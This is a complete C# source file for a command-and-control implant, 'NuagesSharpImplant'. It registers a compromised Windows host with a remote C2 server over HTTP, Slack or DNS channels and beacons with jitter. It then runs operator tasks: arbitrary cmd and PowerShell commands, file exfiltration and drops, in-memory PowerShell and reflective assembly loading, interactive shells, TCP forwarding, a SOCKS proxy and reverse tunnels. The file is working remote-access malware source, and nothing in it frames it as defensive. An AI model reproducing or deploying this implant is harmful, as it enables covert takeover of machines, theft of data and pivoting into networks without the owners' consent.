using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Reflection;
using System.Net.Sockets;
using System.Json;
using NuagesSharpImplant.Connections;
using System.Threading;
using NuagesSharpImplant.Utils;

namespace NuagesSharpImplant
{
    
     class NuagesC2Implant
    {
        private Dictionary<string, string> config;
        private string hostname;
        private string username;
        private string type = "SharpImplant";
        private string localIp;
        private string os;
        private string handler;
        private string connectionString;
        private NuagesC2Connector connector;
        private Dictionary<string, Assembly> assemblies;
        private Dictionary<string, Thread> threads;
        String[] supportedPayloads;
        JsonArray jobs;
        private Random rnd;
        private Dictionary<string, Action<JsonObject>> do_job;
        Posh posh;

        string GetLocalIPv4()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }


        public NuagesC2Implant(Dictionary<string, string> config, NuagesC2Connector connector)
        {
            this.posh = new Posh();

            this.jobs = new JsonArray();

            this.config = config;

            this.connector = connector;

            this.config["handler"] = this.connector.getHandler();

            this.assemblies = new Dictionary<string, Assembly>();

            this.threads = new Dictionary<string, Thread>();

            do_job = new Dictionary<string, Action<JsonObject>>()
              {
                  {"command", (JsonObject) => do_command(JsonObject) },
                  {"cd", (JsonObject) => do_cd(JsonObject) },
                  {"configure", (JsonObject) => do_configure(JsonObject) },
                  {"exit", (JsonObject) => do_exit(JsonObject) },
                  {"kill_job", (JsonObject) => do_kill_job(JsonObject) },
                  {"download", (JsonObject) => do_download(JsonObject) },
                  {"upload", (JsonObject) => do_upload(JsonObject) },
                  {"posh_in_mem", (JsonObject) => do_posh_in_mem(JsonObject) },
                  {"reflected_assembly", (JsonObject) => do_reflected_assembly(JsonObject) },
                  {"interactive", (JsonObject) => do_interactive(JsonObject) },
                  {"tcp_fwd", (JsonObject) => do_tcp_fwd(JsonObject) },
                  {"socks", (JsonObject) => do_socks(JsonObject) },
                  {"rev_tcp", (JsonObject) => do_rev_tcp(JsonObject) }
              };

            try
            {
                this.hostname = Dns.GetHostName();
            }
            catch (Exception e)
            {
                this.hostname = "";
            }

            try
            {
                this.localIp = GetLocalIPv4();
            }
            catch (Exception e)
            {
                this.localIp = "";
            }
            try
            {
                this.username = Environment.UserName;
            }
            catch (Exception e)
            {
                this.username = "";
            }

            this.os = "windows";

            this.type = "SharpImplant";

            this.connectionString = connector.getConnectionString();

            this.supportedPayloads = new string[] { "command", "cd", "configure", "exit", "kill_job", "download", "upload", "posh_in_mem", "reflected_assembly", "interactive", "tcp_fwd", "socks" };

            this.rnd = new Random();

            this.handler = connector.getHandler();
        }

        void Register()
        {
            while (!this.config.ContainsKey("id"))
            {
                try {
                    this.config["id"] = connector.RegisterImplant(type: this.type, hostname: this.hostname, username: this.username, localIp: this.localIp, os: this.os, handler: this.handler, connectionString: this.connectionString, config: this.config, supportedPayloads: this.supportedPayloads);
                    int sleep = 1000 * Int32.Parse(this.config["sleep"]);
                    int jitter = rnd.Next((int)(sleep * 0.7), (int)(sleep * 1.3));
                    System.Threading.Thread.Sleep(jitter);
                }
                catch (Exception e){
                    int jitter = rnd.Next((int)(5000*0.7), (int)(5000 * 1.3));
                    System.Threading.Thread.Sleep(jitter);
                }
            }
            return;
        }
        
        void Heartbeat() {
            this.jobs = this.connector.Heartbeat(this.config["id"]);
        }

        IPAddress getIpAddress(string host){
            IPAddress result;
            if (IPAddress.TryParse(host, out result))
            {
                return result;
            }
            else {
                return Dns.GetHostEntry(host).AddressList[0];
            }
        }


        void do_command(JsonObject job) {
            string jobId = job["_id"];
            string cmd = job["payload"]["options"]["cmd"];
            string path = ".";
            string result;
            bool hasError;
            try
            {
                path = job["payload"]["options"]["path"];
            }
            catch { }
            Directory.SetCurrentDirectory(path);
            if (this.config["shell"].ToLower() == "powershell")
            {
                result = this.posh.execute(cmd, config.ContainsKey("single_posh_runspace") && config["single_posh_runspace"].ToLower()=="true");
                hasError = false;
            }
            else
            {
                System.Diagnostics.Process pProcess = new System.Diagnostics.Process();
                pProcess.StartInfo.FileName = "cmd.exe";
                pProcess.StartInfo.Arguments = " /C " + cmd;
                pProcess.StartInfo.UseShellExecute = false;
                pProcess.StartInfo.RedirectStandardOutput = true;
                pProcess.StartInfo.RedirectStandardError = true;
                pProcess.StartInfo.CreateNoWindow = true;
                pProcess.Start();
                string strOutput = pProcess.StandardOutput.ReadToEnd();
                string strError = pProcess.StandardError.ReadToEnd();
                pProcess.WaitForExit();
                hasError = (pProcess.ExitCode != 0);
                result = strOutput + strError;
            }

            SubmitJobResult(jobId, result, hasError);
        }

        void do_cd(JsonObject job)
        {
            string jobId = job["_id"];
            string dir = job["payload"]["options"]["dir"];
            string path = ".";
            try
            {
                path = job["payload"]["options"]["path"];
            }
            catch { }
            Directory.SetCurrentDirectory(path);

            Directory.SetCurrentDirectory(dir);

            string newDir = Directory.GetCurrentDirectory();

            SubmitJobResult(jobId, newDir, false);

        }

        void do_configure(JsonObject job)
        {
            string jobId = job["_id"];
            JsonValue config = job["payload"]["options"]["config"];
            foreach (KeyValuePair<string, JsonValue> x in config)
            {   
                this.config[x.Key] = x.Value;
                if (x.Key == "refreshrate")
                {
                    this.connector.setRefreshRate(int.Parse(x.Value));
                }
                else if (x.Key == "buffersize")
                {

                    this.connector.setBufferSize(int.Parse(x.Value));
                }

                else if (x.Key == "handler")
                {

                        this.connector = new NuagesC2Connector(parse_handlers(x.Value.ToString().Trim('"')));
                }
            }
            List<KeyValuePair<string, JsonValue>> configList = new List<KeyValuePair<string, JsonValue>>();
            foreach (KeyValuePair<string, string> p in this.config)
            {
                configList.Add(new KeyValuePair<string, JsonValue>(p.Key, p.Value));
            }

            JsonObject configObject = new JsonObject(configList);

            SubmitJobResult(jobId, configObject.ToString(), false);

        }


        NuagesC2Connection parse_handlers(string handlers)
        {

            string[] handler_args = handlers.Split('|');

            NuagesC2Connection con;

            if (handler_args[0].ToLower() == "httpaes256")
            {

                con = new HTTPAES256Connection(handler_args[1], handler_args[2], this.connector.getBufferSize(), this.connector.getRefreshRate());

            }
            else if (handler_args[0].ToLower() == "slackaes256")
            {

                con = new SLACKAES256Connection(handler_args[1], handler_args[2], handler_args[3], this.connector.getBufferSize(), this.connector.getRefreshRate());

            }
            else if (handler_args[0].ToLower() == "dnsaes256")
            {

                con = new DNSAES256Connection(handler_args[1], handler_args[2], this.connector.getBufferSize(), this.connector.getRefreshRate());

            }
            else if (handler_args[0].ToLower() == "multi")
            {
                List<NuagesC2Connection> cons = new List<NuagesC2Connection>();

                string handler_string = handler_args[1];

                for (int i = 2; i < handler_args.Length; i++)
                {
                    handler_string += "|" + handler_args[i];
                }

                string[] handler_strings = handler_string.Split(',');

                for (int i = 0; i < handler_strings.Length; i++)
                {
                    cons.Add(parse_handlers(handler_strings[i]));
                }

                con = new MultiConnection(cons, this.connector.getBufferSize(), this.connector.getRefreshRate());
            }

            else{
                throw new Exception("Handler not supported");
            }
            return con;
        }
      

        void do_exit(JsonObject job)
        {
            string jobId = job["_id"];
            SubmitJobResult(jobId, "Bye Bye!", false);
            System.Environment.Exit(0);

        }

        void do_kill_job(JsonObject job)
        {
            string jobId = job["_id"];
            string target_jobId = job["payload"]["options"]["job_id"];
            this.threads[target_jobId].Abort();
            SubmitJobResult(target_jobId, "Job Killed", true);
            SubmitJobResult(jobId, "Job Successfully Killed", false);
        }

        void do_download(JsonObject job)
        {
            string jobId = job["_id"];
            string path = ".";
            try
            {
                path = job["payload"]["options"]["path"];
            }
            catch { }
            Directory.SetCurrentDirectory(path);
            string file = job["payload"]["options"]["file"];
            string pipe_id = job["payload"]["options"]["pipe_id"];
            int length = (int)job["payload"]["options"]["length"];
            string result = "";
            using (FileStream fs = new FileStream(file, System.IO.FileMode.Create))
            {
                this.connector.Pipe2Stream(pipe_id, length, fs);
                result = fs.Name;
            }
            SubmitJobResult(jobId, result, false);

        }

        void do_upload(JsonObject job)
        {
            string jobId = job["_id"];
            string path = ".";
            try
            {
                path = job["payload"]["options"]["path"];
            }
            catch { }
            Directory.SetCurrentDirectory(path);
            string file = job["payload"]["options"]["file"];
            string pipe_id = job["payload"]["options"]["pipe_id"];
            string result = "";
            using (FileStream fs = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                this.connector.Stream2Pipe(pipe_id, fs);
                result = fs.Name;
            }
            SubmitJobResult(jobId, result, false);

        }

        void do_posh_in_mem(JsonObject job)
        {
            string jobId = job["_id"];
            string command = job["payload"]["options"]["command"];
            string path = ".";
            string pipe_id;
            string script;
            int length = 0;
            try
            {
                length = (int)job["payload"]["options"]["length"];
                pipe_id = job["payload"]["options"]["pipe_id"];
            }
            catch
            {
                pipe_id = "";
            }
            try
            {
                path = job["payload"]["options"]["path"];
            }
            catch { }
            Directory.SetCurrentDirectory(path);
            if (pipe_id != "")
            {
                byte[] buffer = this.connector.PipeRead(pipe_id, length);
                script = Encoding.ASCII.GetString(buffer, 0, buffer.Length);
            }
            else
            {
                script = "";
            }
            script += "\r\n" + command;
            string result = this.posh.execute(script, config.ContainsKey("single_posh_runspace") && config["single_posh_runspace"].ToLower() == "true");
            SubmitJobResult(jobId, result, false);

        }

        void do_reflected_assembly(JsonObject job)
        {
            string jobId = job["_id"];
            string arguments = job["payload"]["options"]["arguments"];
            string method = job["payload"]["options"]["method"];
            string clas = job["payload"]["options"]["class"];
            string pipe_id = job["payload"]["options"]["pipe_id"];
            int length = (int)job["payload"]["options"]["length"];
            string file_id = job["payload"]["options"]["file_id"];
            bool cache = job["payload"]["options"]["cache"];
            bool arg_as_string_array = job["payload"]["options"]["arg_as_string_array"];
            Assembly assembly;
            string result = "";
            Object[] argarr;
            Type[] typearr;
            if (arg_as_string_array)
            {
                typearr = new Type[1];
                argarr = new Object[1];
                argarr[0] = arguments.Split(' ');
                typearr[0] = argarr[0].GetType();
            }
            else
            {
                if (arguments == "")
                {
                    typearr = new Type[0];
                    argarr = new Object[0];
                }
                else
                {
                    string[] strarr = arguments.Split(',');
                    typearr = new Type[strarr.Length];
                    argarr = new Object[strarr.Length];
                    for (int i = 0; i < strarr.Length; i++)
                    {
                        if (strarr[i].Length >= 7 && strarr[i].Substring(0, 6).ToLower() == "[bool]")
                        {
                            argarr[i] = Convert.ToBoolean(strarr[i].Split(']')[1]);
                        }
                        else if (strarr[i].Length >= 6 && strarr[i].Substring(0, 5).ToLower() == "[int]")
                        {
                            argarr[i] = Convert.ToInt32(strarr[i].Split(']')[1]);
                        }
                        else
                        {
                            argarr[i] = strarr[i];
                        }
                        typearr[i] = argarr[i].GetType();
                    }
                } 
            }
            
            if (this.assemblies.ContainsKey(file_id) && cache)
            {
                assembly = this.assemblies[file_id];
            }
            else
            {
                byte[] buffer = this.connector.PipeRead(pipe_id, length);
                assembly = Assembly.Load(buffer);
                if (cache) { this.assemblies[file_id] = assembly; }
            }
            TextWriter oldOut = Console.Out;
            TextWriter oldOutErr = Console.Error;
            MemoryStream ostrm = new MemoryStream();
            StreamWriter writer = new StreamWriter(ostrm);
            Console.SetOut(writer);
            Console.SetError(writer);
            object objResult = assembly.GetType(clas).GetMethod(method, typearr).Invoke(0, argarr);
            Console.SetOut(oldOut);
            Console.SetError(oldOutErr);
            writer.Close();
            ostrm.Close();
            result = Encoding.ASCII.GetString(ostrm.ToArray());
            try { result += "\r\n" + objResult.ToString(); } catch (Exception e) { }
            SubmitJobResult(jobId, result, false);
        }


        void do_interactive(JsonObject job)
        {
            string jobId = job["_id"];
            string filename = job["payload"]["options"]["filename"];
            string pipe_id = job["payload"]["options"]["pipe_id"];
            string path = ".";
            try
            {
                path = job["payload"]["options"]["path"];
            }
            catch { }
            Directory.SetCurrentDirectory(path);
            System.Diagnostics.Process pProcess = new System.Diagnostics.Process();
            pProcess.StartInfo.FileName = filename;
            pProcess.StartInfo.UseShellExecute = false;
            pProcess.StartInfo.RedirectStandardOutput = true;
            pProcess.StartInfo.RedirectStandardError = true;
            pProcess.StartInfo.RedirectStandardInput = true;
            pProcess.StartInfo.CreateNoWindow = true;
            pProcess.Start();
            byte[] outbuff = new byte[this.connector.getBufferSize()];
            byte[] errbuff = new byte[this.connector.getBufferSize()];
            byte[] inbuff;
            IAsyncResult outReadop = pProcess.StandardOutput.BaseStream.BeginRead(outbuff, 0, outbuff.Length, null, null);
            IAsyncResult errReadop = pProcess.StandardError.BaseStream.BeginRead(errbuff, 0, errbuff.Length, null, null);
            int outBytesRead, errBytesRead;
            while (!pProcess.HasExited)
            {
                outBytesRead = 0;
                errBytesRead = 0;
                MemoryStream memStream = new MemoryStream();
                if (outReadop.IsCompleted)
                {
                    outBytesRead = pProcess.StandardOutput.BaseStream.EndRead(outReadop);
                    if (outBytesRead != 0)
                    {
                        memStream.Write(outbuff, 0, outBytesRead);
                        outReadop = pProcess.StandardOutput.BaseStream.BeginRead(outbuff, 0, outbuff.Length, null, null);
                    }
                }
                if (errReadop.IsCompleted)
                {
                    errBytesRead = pProcess.StandardError.BaseStream.EndRead(errReadop);
                    if (errBytesRead != 0)
                    {
                        memStream.Write(errbuff, 0, errBytesRead);
                        errReadop = pProcess.StandardError.BaseStream.BeginRead(errbuff, 0, errbuff.Length, null, null);
                    }
                }
                if (outBytesRead + errBytesRead > 0)
                {
                    inbuff = this.connector.PipeReadWrite(pipe_id, memStream.ToArray());
                    memStream.Dispose();
                }
                else
                {
                    inbuff = this.connector.PipeRead(pipe_id);
                }
                if (inbuff.Length > 0)
                {
                    pProcess.StandardInput.Write(Encoding.ASCII.GetString(inbuff));
                }
                System.Threading.Thread.Sleep(this.connector.getRefreshRate());
            }
            SubmitJobResult(jobId, "Process exited!", false);

        }


        void do_tcp_fwd(JsonObject job)
        {
            string jobId = job["_id"];
            TcpClient tcpClient = new TcpClient();
            string pipe_id = job["payload"]["options"]["pipe_id"];
            string host = job["payload"]["options"]["host"];
            int port = (int)job["payload"]["options"]["port"];
            IPAddress ipAddress = getIpAddress(host);
            tcpClient.Connect(ipAddress, port);
            connector.tcp2pipe(tcpClient, pipe_id);
            SubmitJobResult(jobId, "Tcp Connection Closed", false);

        }

        void do_rev_tcp(JsonObject job) {
            TcpListener server = new TcpListener(IPAddress.Parse(job["payload"]["options"]["bindIP"]), job["payload"]["options"]["bindPort"]);
            server.Start();
            while (true)
            {
                TcpClient newClient = server.AcceptTcpClient();
                
                List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
                list.Add(new KeyValuePair<string, JsonValue>("source", newClient.Client.RemoteEndPoint.ToString()));
                list.Add(new KeyValuePair<string, JsonValue>("tunnelId", job["payload"]["options"]["tunnelId"]));
                JsonObject body = new JsonObject(list);
                try
                {
                    JsonObject callBackResult = this.Callback("rev_tcp_open", body);
                    if (callBackResult["error"])
                    {
                        if (callBackResult["mustClose"])
                        {
                            server.Stop();
                            newClient.Close();
                            throw new Exception(callBackResult["errorMessage"]);
                        }

                    }
                    else
                    {
                        Thread thread = new Thread(() => rev_tcp_thread((TcpClient)newClient, (string)callBackResult["pipe_id"]));
                        thread.Start();
                    }
                }
                catch (Exception) {
                    newClient.Close();
                }
            }
        }

        void rev_tcp_thread(TcpClient client, string pipe_id) {
            try
            {
                try
                {
                    this.connector.tcp2pipe(client, pipe_id);
                }
                catch (Exception e)
                {
                    List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
                    list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
                    JsonObject body = new JsonObject(list);
                    JsonObject callBackResult = this.Callback("pipe_close", body);
                }
                
            }
            catch (Exception e2)
            {
            }
        }
                

        void do_socks(JsonObject job)
        {
            string jobId = job["_id"];
            TcpClient tcpClient = new TcpClient();
            string pipe_id = job["payload"]["options"]["pipe_id"];
            byte[] rBuffer;
            byte[] wBuffer = new byte[2];
            rBuffer = connector.PipeRead(pipe_id, 2, 3000);
            if (rBuffer[0] == 5)
            {
                rBuffer = connector.PipeRead(pipe_id, rBuffer[1], 3000);
                int i;
                for (i = 0; i < rBuffer.Length; i++)
                {
                    if (rBuffer[i] == 0) { break; }
                }
                wBuffer[0] = 5;
                if (rBuffer[i] != 0)
                {
                    wBuffer[1] = 255;
                    connector.PipeWrite(pipe_id, wBuffer);
                    throw new Exception("No auth method found");
                }
                else
                {
                    wBuffer[1] = 0;
                    connector.PipeWrite(pipe_id, wBuffer);
                }
                rBuffer = connector.PipeRead(pipe_id, 4, 3000);
                if (rBuffer[1] != 1)
                {
                    wBuffer[0] = 5;
                    wBuffer[1] = 7;
                    connector.PipeWrite(pipe_id, wBuffer);
                    throw new Exception("Not a connect");
                }
                IPAddress ipAddress;
                byte addressType = rBuffer[3];
                if (addressType == 1)
                {
                    byte[] ipv4 = connector.PipeRead(pipe_id, 4, 3000);
                    ipAddress = new IPAddress(ipv4);
                    rBuffer = connector.PipeRead(pipe_id, 2, 3000); 
                    int port = rBuffer[0] * 256 + rBuffer[1];
                    tcpClient.Connect(ipAddress, port);
                    if (!tcpClient.Connected)
                    {
                        wBuffer[0] = 5;
                        wBuffer[1] = 7;
                        connector.PipeWrite(pipe_id, wBuffer);
                        throw new Exception("Could not connect to host");
                    }
                    wBuffer = new byte[10];
                    wBuffer[0] = 5;
                    wBuffer[1] = 0;
                    wBuffer[2] = 0;
                    wBuffer[3] = addressType;
                    Array.Copy(ipv4, 0, wBuffer, 4, 4);
                    Array.Copy(rBuffer, 0, wBuffer, 8, 2);
                    connector.PipeWrite(pipe_id, wBuffer);
                }
                else if (addressType == 3)
                {
                    rBuffer = connector.PipeRead(pipe_id, 1, 3000);
                    byte hostSize = rBuffer[0];
                    byte[] hostBuffer = connector.PipeRead(pipe_id, hostSize, 3000);
                    ipAddress = getIpAddress(Encoding.ASCII.GetString(hostBuffer));
                    rBuffer = connector.PipeRead(pipe_id, 2, 3000);
                    int port = rBuffer[0] * 256 + rBuffer[1];
                    tcpClient.Connect(ipAddress, port);
                    if (!tcpClient.Connected)
                    {
                        wBuffer[0] = 5;
                        wBuffer[1] = 7;
                        connector.PipeWrite(pipe_id, wBuffer);
                        throw new Exception("Could not connect to host");
                    }
                    wBuffer = new byte[7 + hostSize];
                    wBuffer[0] = 5;
                    wBuffer[1] = 0;
                    wBuffer[2] = 0;
                    wBuffer[3] = addressType;
                    wBuffer[4] = hostSize;
                    Array.Copy(hostBuffer, 0, wBuffer, 5, hostSize);
                    Array.Copy(rBuffer, 0, wBuffer, 5 + hostSize, 2);
                    connector.PipeWrite(pipe_id, wBuffer);
                }
                else
                {
                    wBuffer[0] = 5;
                    wBuffer[1] = 4;
                    connector.PipeWrite(pipe_id, wBuffer);
                    throw new Exception("Invalid destionation address");
                }

            }
            else if (rBuffer[0] == 4)
            {
                if (rBuffer[1] != 1)
                {
                    wBuffer[0] = 0;
                    wBuffer[1] = 91;
                    connector.PipeWrite(pipe_id, wBuffer);
                    throw new Exception("Invalid socks 4 command");
                }
                byte[] bufferPort = connector.PipeRead(pipe_id, 2, 3000);
                int port = bufferPort[0] * 256 + bufferPort[1];
                byte[] ipv4 = connector.PipeRead(pipe_id, 4, 3000);
                IPAddress ipAddress = new IPAddress(ipv4);
                while (rBuffer[0] != 0)
                {
                    rBuffer = connector.PipeRead(pipe_id, 1, 3000);
                }
                tcpClient.Connect(ipAddress, port);
                wBuffer = new byte[8];
                wBuffer[0] = 0;
                if (tcpClient.Connected)
                {
                    wBuffer[1] = 90;
                    Array.Copy(ipv4, 0, wBuffer, 2, 4);
                    Array.Copy(bufferPort, 0, wBuffer, 6, 2);
                    connector.PipeWrite(pipe_id, wBuffer);
                }
                else
                {
                    wBuffer[1] = 91;
                    Array.Copy(ipv4, 0, wBuffer, 2, 4);
                    Array.Copy(bufferPort, 0, wBuffer, 6, 2);
                    connector.PipeWrite(pipe_id, wBuffer);
                    throw new Exception("Could not connect to host");
                }
            }
            try {
                List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
                list.Add(new KeyValuePair<string, JsonValue>("destination", tcpClient.Client.RemoteEndPoint.ToString()));
                list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
                this.Callback("pipe_dest", new JsonObject(list));
            }
            catch (Exception) { }
            
            connector.tcp2pipe(tcpClient, pipe_id);
            SubmitJobResult(jobId, "Tcp Connection Closed", false);

        }



        void ExecuteJob(JsonObject job)
        {
            try
            {
                string jobType = job["payload"]["type"];
                if (do_job.ContainsKey(jobType)) {
                    do_job[jobType](job);
                }
                else
                {
                    throw new Exception("Payload type not supported");
                }
            }
            catch (Exception e)
            {
                try
                {
                    string jobId = job["_id"];
                    SubmitJobResult(jobId: jobId, result: e.Message, error: true);
                }
                catch (Exception e2) { }
            }

        }

        private void SubmitJobResult(string jobId, string result = "", bool error = false)
        {
            int n;
            int buffersize = Convert.ToInt32(this.config["buffersize"]);
            int refreshrate = Convert.ToInt32(this.config["refreshrate"]);
            for (n = 0; (n + 1) * buffersize < result.Length; n++)
            {
                this.connector.SubmitJobResult(jobId: jobId, result: result.Substring(n * buffersize, buffersize), moreData: true, error: error, n: n);
                Thread.Sleep(refreshrate);
            }
            this.connector.SubmitJobResult(jobId: jobId, result: result.Substring(n * buffersize, result.Length - (n * buffersize)), moreData: false, error: error, n: n);
            this.threads.Remove(jobId);
        }

        private JsonObject Callback(string callback, JsonObject data)
        {

            return this.connector.Callback(callback, data);
        }

        private JsonObject Callback(string callback, JsonObject data, string runId)
        {

            return this.connector.Callback(callback, data, runId);
        }

        public void Start()
        {
            this.Register();
            int sleep = 5000;
            while (true)
            {
                try
                {
                    try
                    {
                        sleep = 1000 * Int32.Parse(this.config["sleep"]);
                    }
                    catch {
                        sleep = 5000;
                    }
                    int jitter = rnd.Next((int)(sleep * 0.7), (int)(sleep * 1.3));
                    Thread.Sleep(jitter);
                    this.Heartbeat();
                    string multiThread = this.config.ContainsKey("multithread") ? this.config["multithread"] : "true";
                    if (multiThread.ToLower() == "false")
                    {
                        foreach (JsonValue job in this.jobs)
                        {
                            this.ExecuteJob((JsonObject)job);
                        }
                    }
                    else
                    {
                        foreach (JsonValue job in this.jobs)
                        {
                            Thread thread = new Thread(() => this.ExecuteJob((JsonObject)job));
                            this.threads[job["_id"]] = thread;
                            thread.Start();
                        }
                    }    
                }
                catch (WebException ex)
                {
                    if (ex.Status == WebExceptionStatus.ProtocolError && ex.Response != null)
                    {
                        var resp = (HttpWebResponse)ex.Response;
                        if (resp.StatusCode == HttpStatusCode.NotFound)
                        {
                            this.config.Remove("id");
                            this.Register();
                        }
                    }
                }
                catch (Exception e)
                {
                }
            }

        }
    }
}
